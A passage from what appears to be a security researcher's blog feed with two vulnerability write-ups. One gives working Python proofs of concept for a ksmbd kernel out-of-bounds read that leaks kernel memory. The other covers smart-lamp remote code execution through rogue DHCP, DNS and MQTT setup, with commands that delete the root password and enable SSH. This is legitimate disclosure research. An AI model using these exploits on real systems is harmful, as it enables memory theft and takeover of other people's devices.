hdr-&gt;NextCommand == hdr-&gt;DataOffset + hdr-&gt;Length  // SMB_WRITE</code></pre><figcaption><p><span style="white-space: pre-wrap;">The assertions put onto the packet, for validation.</span></p></figcaption></figure><p>But it does not assert <code>work-&gt;next_smb2_rcv_hdr_off + hdr-&gt;NextCommand &lt;= get_rfc1002_len(work-&gt;request_buf)</code>, which is the official patch.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int smb2_get_data_area_len(unsigned int *off, unsigned int *len,
				  struct smb2_hdr *hdr)
{
	int ret = 0;

	*off = 0;
	*len = 0;

	switch (hdr-&gt;Command) {
	// [snip] not reached
	case SMB2_WRITE:
		if (((struct smb2_write_req *)hdr)-&gt;DataOffset ||
		    ((struct smb2_write_req *)hdr)-&gt;Length) {
			*off = max_t(unsigned int,
				     le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;DataOffset),
				     offsetof(struct smb2_write_req, Buffer));
			*len = le32_to_cpu(((struct smb2_write_req *)hdr)-&gt;Length);
			break;
		}

		*off = le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;WriteChannelInfoOffset);
		*len = le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;WriteChannelInfoLength);
		break;
	// [snip] not reached
	default:
		// [snip] not reached
	}

	// [snip] return error if offset &gt; 4096

	return ret;
}

static int smb2_calc_size(void *buf, unsigned int *len)
{
	struct smb2_pdu *pdu = (struct smb2_pdu *)buf;
	struct smb2_hdr *hdr = &amp;pdu-&gt;hdr;
	unsigned int offset; /* the offset from the beginning of SMB to data area */
	unsigned int data_length; /* the length of the variable length data area */
	int ret;

	*len = le16_to_cpu(hdr-&gt;StructureSize);
	*len += le16_to_cpu(pdu-&gt;StructureSize2);

	if (has_smb2_data_area[le16_to_cpu(hdr-&gt;Command)] == false) {
		// SMB_ECHO will reach this
        goto calc_size_exit;
	}

	// SMB_WRITE will reach this
	ret = smb2_get_data_area_len(&amp;offset, &amp;data_length, hdr);
    // [snip] return error if ret &lt; 0

	if (data_length &gt; 0) {
		// [snip] return error when data overlaps with next cmd

		*len = offset + data_length;
	}

calc_size_exit:
	ksmbd_debug(SMB, &quot;SMB2 len %u\n&quot;, *len);
	return 0;
}

int ksmbd_smb2_check_message(struct ksmbd_work *work)
{
	struct smb2_pdu *pdu = ksmbd_req_buf_next(work);
	struct smb2_hdr *hdr = &amp;pdu-&gt;hdr;
	int command;
	__u32 clc_len;  /* calculated length */
	__u32 len = get_rfc1002_len(work-&gt;request_buf);

	if (le32_to_cpu(hdr-&gt;NextCommand) &gt; 0)
		len = le32_to_cpu(hdr-&gt;NextCommand);
	else if (work-&gt;next_smb2_rcv_hdr_off)
		len -= work-&gt;next_smb2_rcv_hdr_off;

	// [snip] check flag in header

	if (hdr-&gt;StructureSize != SMB2_HEADER_STRUCTURE_SIZE) {
		// [snip] return error
	}

	command = le16_to_cpu(hdr-&gt;Command);
	// [snip] check if command is valid

	if (smb2_req_struct_sizes[command] != pdu-&gt;StructureSize2) {
		// [snip] return error (with exceptions)
	}

	if (smb2_calc_size(hdr, &amp;clc_len)) {
		// [snip] return error (with exceptions)
	}

	if (len != clc_len) {
		// [snip] return error (with exceptions)
	}

validate_credit:
	// [snip] irrelevant credit check

	return 0;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The functions causing the vulnerability.</span></p></figcaption></figure><p>As you can see, for SMB_WRITE we can set an arbitrary packet size by setting  <code>hdr-&gt;Length</code> and <code>hdr-&gt;NextCommand</code> variables to compliment each other. As per SMB_ECHO, we just need to set <code>hdr-&gt;NextCommand</code> to the expected value, without actually filling in <code>smb2_echo_req-&gt;reserved</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct smb2_echo_req {
	struct smb2_hdr hdr;
	__le16 StructureSize;	/* Must be 4 */
	__u16  Reserved;
} __packed;</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_echo_req</span></code><span style="white-space: pre-wrap;"> struct.</span></p></figcaption></figure><h3 id="exploitation">Exploitation</h3><p>To leak 2 bytes using <code>SMB_ECHO</code>:</p><ol><li>Set <code>smb2_echo_req-&gt;StructureSize = p16(4)</code></li><li>Set <code>smb2_echo_req-&gt;hdr.NextCommand = sizeof(smb2_echo_req-&gt;hdr) + smb2_echo_req-&gt;StructureSize</code></li><li>Send request</li><li>Read echo response, with the last 2 bytes being an OOB read.</li></ol><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3
from pwn import p64, p32, p16, p8


def main():
    print(&quot;[*] connecting to SMB server...&quot;)
    conn = smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445)

    packet = smb3.SMB3Packet()
    packet[&apos;Command&apos;] = smb3.SMB2_ECHO
    packet[&quot;Data&quot;] = p16(0x4)
    packet[&quot;NextCommand&quot;] = 64+4

    print(&quot;[*] sending OOB read...&quot;)
    conn.sendSMB(packet)

    print(&quot;[*] reading response...&quot;)
    rsp = conn.recvSMB().rawData
    print(rsp)


if __name__ == &quot;__main__&quot;:
    main()</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-980</span></code><span style="white-space: pre-wrap;"> PoC exploit using </span><code spellcheck="false" style="white-space: pre-wrap;"><span>SMB_ECHO</span></code></p></figcaption></figure><p>For the <code>SMB_WRITE</code> path, here&apos;s the struct and the steps:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct smb2_write_req {
	struct smb2_hdr hdr;
	__le16 StructureSize; /* Must be 49 */
	__le16 DataOffset; /* offset from start of SMB2 header to write data */
	__le32 Length;
	__le64 Offset;
	__u64  PersistentFileId; /* opaque endianness */
	__u64  VolatileFileId; /* opaque endianness */
	__le32 Channel; /* MBZ unless SMB3.02 or later */
	__le32 RemainingBytes;
	__le16 WriteChannelInfoOffset;
	__le16 WriteChannelInfoLength;
	__le32 Flags;
	__u8   Buffer[];
} __packed;</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_write_req</span></code><span style="white-space: pre-wrap;"> struct.</span></p></figcaption></figure><ol><li>Set <code>smb2_write_req-&gt;StructureSize = 49</code></li><li>Set <code>smb2_write_req-&gt;DataOffset = smb2_write_req-&gt;StructureSize + 64</code> to start reading the content without the packet</li><li>Set <code>smb2_write_req-&gt;Length = 65536</code> to write 65536 bytes from the packet to the file</li><li>Set <code>smb2_write_req-&gt;hdr.NextCommand = smb2_write_req-&gt;Length  + smb2_write_req-&gt;DataOffset</code> to spoof the request size</li><li>Open a file in the SMB share in read/write mode: <code>file_id = smb_open(&quot;dump.bin&quot;, &quot;rw&quot;)</code></li><li>Set <code>smb2_write_req-&gt;PersistentFileId = file_id</code></li><li>Send the request</li><li>Read the file in the SMB share: <code>dump = smb_read(file_id)</code></li></ol><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3
from pwn import p64, p32, p16, p8


def main(username: str, password: str, share: str, filename: str):
    print(&quot;[*] connecting to SMB server...&quot;)
    conn = smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445)

    print(f&quot;[*] logging into SMB server in (username: &apos;{username}&apos;, password: &apos;{password}&apos;)...&quot;)
    conn.login(user=username, password=password)

    print(f&quot;[*] connecting to tree/share: &apos;{share}&apos;&quot;)
    tree_id = conn.connectTree(share)

    packet = smb3.SMB3Packet()
    packet[&apos;Command&apos;] = smb3.SMB2_WRITE

    StructureSize = 49
    DataOffset = 64 + StructureSize  # fixed packet size excl buffer
    Length = 0x10000  # max credits: 8096, so max buffer: 8096*8 (0x10000), but max IO size: 4*1024*1024 (0x400000)

    # this is ugly but acquires a RW handle for the &apos;{filename}&apos; file containing the memory
    file_id = conn.create(tree_id, filename, desiredAccess=smb3.FILE_READ_DATA|smb3.FILE_SHARE_WRITE, creationDisposition=smb3.FILE_OPEN|smb3.FILE_CREATE,
                            creationOptions=smb3.FILE_NON_DIRECTORY_FILE, fileAttributes=smb3.FILE_ATTRIBUTE_NORMAL, shareMode=smb3.FILE_SHARE_READ|smb3.FILE_SHARE_WRITE)

    packet[&quot;Data&quot;] = (p16(StructureSize) + p16(DataOffset) + p32(Length) + p64(0) + file_id[:8] + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0))
    packet[&quot;TreeID&quot;] = tree_id
    packet[&quot;NextCommand&quot;] = DataOffset+Length  # the end of the buffer is past the end of the packet

    print(f&quot;[*] sending OOB read for 65536 bytes... (writing to file &apos;{filename}&apos;)&quot;)
    conn.sendSMB(packet)

    print(&quot;[*] closing file descriptors...&quot;)
    conn.close(tree_id, file_id)  # close fd&apos;s bcs impacket is impacket

    print(f&quot;[*] reading file containing kernel memory: &apos;{filename}&apos;&quot;)
    conn.retrieveFile(share, filename, print)  # print file (containing kmem dump)


if __name__ == &quot;__main__&quot;:
    main(&quot;user&quot;, &quot;pass&quot;, &quot;files&quot;, &quot;dump.bin&quot;)</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-980</span></code><span style="white-space: pre-wrap;"> PoC exploit using </span><code spellcheck="false" style="white-space: pre-wrap;"><span>SMB_WRITE</span></code></p></figcaption></figure><h2 id="conclusion">Conclusion</h2><p>Thank you for reading my write-up on this Linux kernel vulnerability. I hope you learned about the ksmbd kernel subsystem and that you like the write-up style.</p><p>For questions, job inquiries, and other things, please send an email to <a href="mailto:notselwyn@pwning.tech" rel="noreferrer">notselwyn@pwning.tech</a> (<a href="https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc" rel="noreferrer">PGP key</a>).</p>]]></content:encoded></item><item><title><![CDATA[How I hacked smart lights: the story behind CVE-2022-47758]]></title><description><![CDATA[<p>In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&apos;s firmware for unauthenticated remote code execution on the entire device with the highest</p>]]></description><link>https://pwning.tech/cve-2022-47758/</link><guid isPermaLink="false">658f44f8d32e980001de21ef</guid><category><![CDATA[Infrastructure]]></category><category><![CDATA[Real World]]></category><category><![CDATA[x64 Assembly]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Wed, 08 Mar 2023 07:30:00 GMT</pubDate><content:encoded><![CDATA[<p>In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&apos;s firmware for unauthenticated remote code execution on the entire device with the highest privileges and hence abuse it for information gathering (and for haunting someone in their own house). Additionally, we could pivot to the management devices using a <a href="https://pwning.tech/cve-2022-46640">vulnerability in the smart lamps&apos; desktop management software</a> (CVE-2022-46640). To make matters more interesting: the vulnerable traffic flowed through an encrypted outbound connection which means that it typically isn&apos;t blocked by a firewall. This blogpost serves as a cautionary tale for both vendors and consumers, highlighting the importance of IoT security. Join us as we dive into the technical details and lessons learned from our research.</p><h2 id="content">Content</h2><ol><li>Introduction to smart lighting</li><li>Proof of Concept exploit</li><li>Analyzing the smart device firmware</li><li>Creating a Proof of Concept exploit</li><li>Conclusion</li></ol><h2 id="introduction-to-smart-lighting">Introduction to smart lighting</h2><p>IoT smart lighting bring convenience and style to your home lighting. These lamps can be controlled through a variety of devices, including smartphones and computers, allowing you to change the color, brightness, and even schedule when they turn on and off. This allows you to customize your lighting to fit your mood and needs, making your home a more comfortable and inviting place. The integration of these lamps into the internet of things (IoT) allows for even greater control and automation, streamlining your home lighting experience and making it easier than ever to create the perfect ambiance.</p><p>However, as with any connected device, there are security implications to consider. A vulnerability in one of these smart lamps could potentially give an attacker access to your home network and other connected devices... It is important to follow best practices for securing your home network to reduce the risk of a security breach. Examples of these best practices are keeping your devices&apos; software up-to-date and perhaps even keeping the smart devices on a seperate sub-network to avoid privacy concerns. </p><h2 id="proof-of-concept-exploit">Proof of Concept exploit</h2><p>The goal of our proof of concept (PoC) exploit is proving that we can remotely execute code on our own smart lamps. For the PoC exploit we&apos;re redirecting local traffic to the vendors MQTT(S) broker to our own machine via malicious DNS records. In practice, an attacker could perform this redirect by committing either a rogue DHCP server attack, hacking a router, hacking a DNS server, et cetera. Once we have control over the MQTT traffic, we send a debugging command to a debugging endpoint on our smart lamp. Finally, we activate a persistent OpenSSH server in order to easily access the lamp.</p><h3 id="methodology">Methodology</h3><p>We use the following methodology in this blogpost:</p><ul><li>*.acme.org - the<strong> </strong>vendor domain names</li><li>mqtt.acme.org - the vendor MQTT broker domain name</li><li>192.168.128.0/24 - our controlled network environment</li><li>192.168.128.10 - our attacker machine</li><li>192.168.128.20 - our vulnerability smart device</li></ul><h3 id="spoofing-dns">Spoofing DNS</h3><p>In order to spoof DNS we need to set up a rogue DHCP server. The Dynamic Host Configuration Protocol (DHCP) is primarily used by network administrators to set the private ip addreses of devices on the network dynamically. However, DHCP packets also have a few more interesting parameters: domain name servers IP addresses, hostnames, and even gateway IP addresses. In order to MitM MQTT traffic to <code>mqtt.acme.org</code>, we are setting the domain name of the smart lamp by creating a malicious DHCP offer - using our rogue DHCP server - which sets the domain name server to <code>192.168.128.10</code>. </p><p>By installing <code>isc-dhcp-server</code> on our Linux install and configuring it to run maliciously on our local network environment (<code>192.168.128.0/24</code>). We want to make the smart lamp use our own DNS resolver over at <code>192.168.128.10</code>. &#xA0;The configuration we use is as following:</p><figure class="kg-card kg-code-card"><pre><code class="language-conf">subnet 192.168.128.0 netmask 255.255.255.0 {
    range                           192.168.128.10 192.168.128.254;
    option broadcast-address        192.168.128.255;
    option routers                  192.168.128.1;
    option subnet-mask              255.255.255.0;
    option domain-name-servers      192.168.128.10;  # set DNS resolver

    host router {
        hardware ethernet &lt;mac_router&gt;;
        fixed-address 192.168.128.1;
    }

    host attacker {
        hardware ethernet &lt;mac_attacker&gt;;
        fixed-address 192.168.128.10;
    }

    host lamp {
        hardware ethernet &lt;mac_lamp&gt;;
        fixed-address 192.168.128.20;
    }
}</code></pre><figcaption><code>/etc/dhcp/dhcpd.conf</code> - setup DHCP server to spoof DNS and spoof DNS</figcaption></figure><p>In order to change the IP address to which <code>mqtt.acme.org</code> points, we need to setup our own DNS resolver by installing <code>bind9</code> and setting a custom DNS record for the zone<code>mqtt.acme.org</code> which points to our own MQTT broker:</p><figure class="kg-card kg-code-card"><pre><code class="language-conf">;
; BIND data file for local loopback interface
;
$TTL	604800
@	IN	SOA	mqtt.acme. root.mqtt.acme.org. (
			      2		; Serial
			 604800		; Refresh
			  86400		; Retry
			2419200		; Expire
			 604800 )	; Negative Cache TTL

;
@	IN	NS	ns.mqtt.acme.org.
ns	IN	A	192.168.128.10
@	IN	A	192.168.128.10</code></pre><figcaption><code>/etc/bind/named.conf.local</code> - malicious DNS record (redirects traffic to our malicious IP)</figcaption></figure><h3 id="setting-up-a-malicious-mqtt-broker">Setting up a malicious MQTT broker</h3><p>Since our traffic to <code>mqtt.acme.org</code> now points to our own IP address (<code>192.168.128.10</code>), we can eavesdrop the traffic. However, in order to interact with this traffic, we need to set an MQTT broker up on <code>192.168.128.10</code>. We do this so we can publish to a custom debugging MQTT channel devoted to debugging (custom made by Acme). By publishing on this MQTT channel, we can execute commands. It&apos;s important that the server listens on port 443, has TLS encryption and allows anonymous logins. Hence, if the smart lamp tries to connect to <code>mqtts://nobody@mqtt.acme.org:443</code> it should succeed. We configured it by using the following configuration:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># Place your local configuration in /etc/mosquitto/conf.d/
#
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

listener 443
cafile /etc/mosquitto/ca_certificates/ca.crt
keyfile /etc/mosquitto/certs/server.key
certfile /etc/mosquitto/certs/server.crt
tls_version tlsv1.2
allow_anonymous true
protocol mqtt

persistence true
persistence_location /var/lib/mosquitto/
log_dest file /var/log/mosquitto/mosquitto.log

include_dir /etc/mosquitto/conf.d</code></pre><figcaption><code>/etc/mosquitto/mosquitto.conf</code> - malicious MQTT(S) broker to allows all logins</figcaption></figure><p>As you might have noticed, we are dealing with MQTT<strong>S</strong>. Like HTTPS, the S in MQTTS stands for Secure. In order to make such a protocol secure, we need to create TLS certifications so we can encrypt the MQTT trafifc coming from our own MQTT broker. We can create such TLS certifications by running the following command: </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ openssl genrsa -des3 -out /etc/mosquitto/ca_certificates/ca.key 2048
$ openssl req -new -x509 -days 1826 -key /etc/mosquitto/ca_certificates/ca.key -out /etc/mosquitto/certs/ca.crt
$ openssl genrsa -out /etc/mosquitto/certs/server.key 2048</code></pre><figcaption>Creating TLS keys/certificates using OpenSSL</figcaption></figure><h3 id="performing-the-exploit">Performing the exploit</h3><p>Now we have our infrastructure set up, we need to reboot the lamp such that it will trigger a DHCP discover request as part of the Discover Offer Request Accept (DORA) sequence. The next part of the DORA sequence would be &apos;Offer&apos;, where the server offers a new IP address (and our domain name server IP address) to our smart lamp. That offer will set the lamps DNS records of <code>mqtt.acme.org</code> to <code>192.168.128.10</code>. </p><p>We can confirm that the vulnerable smart lamp is using our own MQTT broker by inspecting the local traffic using Wireshark on <code>192.168.128.10</code>. After the victim device has connected to our server, we want to activate an OpenSSH server. In order to do this, we create the <code>/acme/ssh_enabled</code> file which enables persistent SSH access after the device reboots. We could probably do it without rebooting, be it would be a lot more unnecessary effort. After that, we stop the debugging of the touch command, and instead debug <code>passwd -d root</code> which deletes the password for the root user. This is convenient, because the default password is unknown and this way we can set the password without a TTY. Additionally the SSH server allows passwordless logins. In order to pull it off, we execute the following commands using <code>mosquitto_pub</code> (publishes messages to the Mosquitto broker):</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/touch /acme/ssh_enabled&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/passwd -d root&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /sbin/reboot&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><figcaption>Sending our payloads to our own MQTT broker</figcaption></figure><p>Once we started the OpenSSH server on the smart lamp, we can log into our smart lamp by simply executing <code>ssh root@192.168.128.20</code>.</p><pre><code class="language-bash">$ ssh root@192.168.128.20

root@192.168.128.20:~ $ uname -a
Linux AcmeProduct-MAC 4.14.195 #0 Sun Sep 6 16:19:39 2020 mips GNU/Linux</code></pre><h2 id="analyzing-the-smart-device-firmware">Analyzing the smart device firmware</h2><p>Since we have access to the firmware, we can analyze the firmware by extracting it using Binwalk - a tool for analyzing and extracting firmware. By running it with the <code>-e</code> (<code>--extract</code>) parameter, we can extract the firmware partitions. In our case, we can see that we have 3 partitions: a bootloader, a kernel, and an OpenWRT install (interestingly enough). </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ binwalk -e 4.5.1.firmware

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
80            0x50            uImage header, header size: 64 bytes, header CRC: 0xF012020D, created: 2020-09-06 16:19:39, image size: 1594132 bytes, Data Address: 0x80000000, Entry Point: 0x80000000, data CRC: 0xFB832D09, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;MIPS OpenWrt Linux-4.14.195&quot;
144           0x90            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 5029060 bytes
1594276       0x1853A4        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7060690 bytes, 1210 inodes, blocksize: 262144 bytes, created: 2020-09-06 16:19:39</code></pre><figcaption>Binwalk output when extracting the firmware</figcaption></figure><h3 id="enumerating-the-openwrt-installation">Enumerating the OpenWRT installation</h3><p>The output of Binexp is a SquashFS filesystem instance which got carved out of the extracted partition. SquashFS performs heavy compressions and hence it probably was used by the smart lamp developers because it saves storage costs. Since SquashFS doesn&apos;t have different layers such as OverlayFS, we do not have any hassle regarding fixing the FS.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ tree . -L 2
.
&#x251C;&#x2500;&#x2500; 4.5.1.firmware
&#x2514;&#x2500;&#x2500; squashfs
    &#x251C;&#x2500;&#x2500; bin
    &#x251C;&#x2500;&#x2500; dev
    &#x251C;&#x2500;&#x2500; etc
    &#x251C;&#x2500;&#x2500; lib
    &#x251C;&#x2500;&#x2500; mnt
    &#x251C;&#x2500;&#x2500; acme_config
    &#x251C;&#x2500;&#x2500; overlay
    &#x251C;&#x2500;&#x2500; proc
    &#x251C;&#x2500;&#x2500; rom
    &#x251C;&#x2500;&#x2500; root
    &#x251C;&#x2500;&#x2500; sbin
    &#x251C;&#x2500;&#x2500; sys
    &#x251C;&#x2500;&#x2500; tmp
    &#x251C;&#x2500;&#x2500; usr
    &#x251C;&#x2500;&#x2500; var -&gt; tmp
    &#x2514;&#x2500;&#x2500; www</code></pre><figcaption>The output directory of binwalk</figcaption></figure><p>One of the first things we did was verifying with what OS we were working and checking which users existed on the device. After we established that the lamp was running OpenWRT - a router OS interestingly enough - and we couldn&apos;t find any custom users in <code>/etc/passwd</code>, we decided to look into the next interesting directory: <code>/acme_config/</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ cat etc/os-release                 
NAME=&quot;OpenWrt&quot;
VERSION=&quot;19.07.4&quot;
ID=&quot;openwrt&quot;
ID_LIKE=&quot;lede openwrt&quot;
PRETTY_NAME=&quot;OpenWrt 19.07.4&quot;
VERSION_ID=&quot;19.07.4&quot;
HOME_URL=&quot;https://openwrt.org/&quot;
BUG_URL=&quot;https://bugs.openwrt.org/&quot;
SUPPORT_URL=&quot;https://forum.openwrt.org/&quot;
BUILD_ID=&quot;r11208-ce6496d796&quot;
OPENWRT_BOARD=&quot;ramips/mt76x8&quot;
OPENWRT_ARCH=&quot;mipsel_24kc&quot;
OPENWRT_TAINTS=&quot;no-all busybox&quot;
OPENWRT_DEVICE_MANUFACTURER=&quot;OpenWrt&quot;
OPENWRT_DEVICE_MANUFACTURER_URL=&quot;https://openwrt.org/&quot;
OPENWRT_DEVICE_PRODUCT=&quot;Generic&quot;
OPENWRT_DEVICE_REVISION=&quot;v0&quot;
OPENWRT_RELEASE=&quot;OpenWrt 19.07.4 r11208-ce6496d796&quot;</code></pre><figcaption><code>/etc/os-release</code> - OS related information</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</code></pre><figcaption><code>/etc/passwd</code> - users on the device</figcaption></figure><p>We started searching in <code>/acme_config/</code> for interesting keywords such as <code>grep -iRPe &apos;(ssh)|(mqtt)|(ftp)|(api)&apos;</code> to find possible exposed services as an attack surface. As we researched the binaries containing the specified keywords, we found out that a particular binary called <code>ColorCC.bin</code> contained the entire smart lamp API accessible via HTTP (built using the OpenAPI C++ SDK). We tried searching for memory corruption bugs for easy RCE but could not find any. Next, a binary called <code>cloud_daemon</code> caught our attention because it contained an MQTT client...</p><h3 id="investigating-the-mqtt-handler">Investigating the MQTT handler</h3><p>In order to grasp the internal logic of the <code>cloud_daemon</code>, we can open it in Ghidra. Ghidra is a software reverse engineering suite developed by the National Security Agency (NSA). We can use Ghidra to decompile Assembly instructions (the raw instructions that go into the CPU) into normal C, which is relatively readable by code monkeys like us.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void main(int argc,char **env)
{
  int iVar1;
  long lVar2;
  int i;
  char **ppcVar3;
  long port;
  char *pcVar4;
  char addr_str [128];
  pthread_t pThread;
  undefined4 uStack_34;
  char *pcStack_30;
  
  printf(&quot;This is Cloud Daemon version %s (%s)\n&quot;,&quot;1.12.0&quot;,
         &quot;1.12.0 / Wed Aug 26 09:08:45 EDT 2020 / Backlog0740 / Color_develop&quot;);
  signal(2,ctrlc_handler);
  signal(0xf,ctrlc_handler);
  memset(addr_str,0,0x80);
  port = 0;
  do {
    if (argc &lt;= 1) {
      // set MQTT channel variables
      sprintf(&amp;update_server,&quot;acme/device/%s/update/server&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;update_client,&quot;acme/device/%s/update/client&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;exec_server,&quot;acme/device/%s/exec/server&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;exec_client,&quot;acme/device/%s/exec/client&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;uptime_server,&quot;acme/device/%s/uptime/server&quot;,&amp;ROM_SERIAL_NUMBER);
      sprintf(&amp;uptime_client,&quot;acme/device/%s/uptime/client&quot;,&amp;ROM_SERIAL_NUMBER);

      // print which MQTT channels will be used for what
      printlog(3,&quot;We will publish firmware communications to [%s]\n&quot;,&amp;update_client);
      printlog(3,&quot;We will receive firmware communications from [%s]\n&quot;,&amp;update_server);
      printlog(3,&quot;We will publish debug communications to [%s]\n&quot;,&amp;exec_client);
      printlog(3,&quot;We will receive debug communications from [%s]\n&quot;,&amp;exec_server);
      printlog(3,&quot;We will publish health communications to [%s]\n&quot;,&amp;uptime_client);
      printlog(3,&quot;We will receive health communications from [%s]\n&quot;,&amp;uptime_server);
      
      set_host(addr_str, port);
     
      // creates posix thread to execute the start_firmware_checks() function
      while (iVar1 = pthread_create(&amp;pThread, NULL, start_firmware_checks, &amp;DAT_00414c84), iVar1 != 0 ) {
        printlog(1,&quot;Error creating https upgrade check thread, retrying in %d seconds ...\n&quot;,timeout);
        printlog(1,&quot;Error in (func, line): %s, %d\n&quot;, &amp;function, 0x41f);
        sleep(timeout);
      }

      printlog(2, &quot;Successfully launched https upgrade check thread\n&quot;);
      cloud_pipe_start(&amp;ROM_DEVICE_ID,&amp;ROM_SERIAL_NUMBER, channel, on_disconnect_cb, on_tick_cb, 1000);
      if (DAT_004152f0 != 0) {
        printlog(2, &quot;Rebooting\n&quot;);
        system(&quot;reboot&quot;);
      }
      return;
    }
}
</code></pre><figcaption><code>main()</code> function - initializes the MQTT client channels</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>Client will publish firmware communications to [acme/device/serialno/update/client]
Client will receive firmware communications from [acme/device/serialno/update/server]
Client will publish debug communications to [acme/device/serialno/exec/client]
Client will receive debug communications from [acme/device/serialno/exec/server]
Client will publish health communications to [acme/device/serialno/uptime/client]
Client will receive health communications from [acme/device/serialno/uptime/server]</code></pre><figcaption>Communication channels used by MQTT client</figcaption></figure><p>We can see that <code>cloud_pipe_start()</code> (<code>libcloudpipe.so</code>) is called in <code>main()</code>, which registers several callback functions: <code>cloud_pipe_start(..., ..., register_channels, on_disconnect_cb, on_tick_cb, ...)</code>. The function <code>register_channels</code> is a wrapper for registering handlers for the MQTT channels discussed above.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void register_channels(void)
{
  printlog(2,&quot;Connection up\n&quot;);
  cloud_pipe_subscribe(&amp;uptime_server,respond_healthcheck);
  cloud_pipe_subscribe(&amp;update_server,update_firmware);
  cloud_pipe_subscribe(&amp;exec_server,debug);
  return;
}</code></pre><figcaption><code>register_channels()</code> - registers the MQTT message handlers per MQTT channel</figcaption></figure><p>The most interesting handler function sounds like <code>debug</code>, which handles messages on the channel <code>/acme/device/serialno/exec/server</code>. This function handles debug requests: it can execute a binary (debug a process) based on the MQTT requests parameters, or kill the process (stop the debugging). In order to start debugging a binary, we can publish the following the the server exec channel: <code>debug /bin/echo &quot;Hello World!&quot;</code>, of which &quot;Hello World!&quot; should be nicely returned in an MQTT message on the channel <code>/acme/device/serialno/exec/client</code>. When we want to execute another binary or generally stop debugging, we can simply issue a <code>stop</code> command.</p><p>So far, I hope that the following part of the MQTT payload in the PoC exploit makes sense:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># create a file called /acme_config/ssh_enabled by &apos;debugging&apos; /bin/touch
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/touch /acme/ssh_enabled&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# stop debugging so we can execute another command
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# delete (reset) the root password by &apos;debugging&apos; /bin/passwd
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/passwd -d root&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# stop debugging so we can execute another command
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt

# reboot to start the OpenSSH server, but we can probably do it without reboot
